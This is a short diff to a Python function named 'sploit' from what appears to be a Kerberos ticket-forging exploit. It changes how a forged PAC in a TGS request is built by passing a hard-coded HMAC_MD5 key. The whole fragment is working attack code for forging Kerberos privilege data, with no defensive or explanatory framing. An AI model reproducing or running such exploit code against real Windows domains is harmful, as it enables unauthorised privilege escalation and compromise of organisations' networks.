@@ -62,7 +62,7 @@ def sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm
     subkey = generate_subkey()
     nonce = getrandbits(31)
     current_time = time()
-    pac = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time))
+    pac = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time, kdc_key=(HMAC_MD5, '3HeadedChihuahua')))
     tgs_req = build_tgs_req(user_realm, 'krbtgt', target_realm, user_realm, user_name,
                             tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=False)
     sys.stderr.write(' Done!\n')
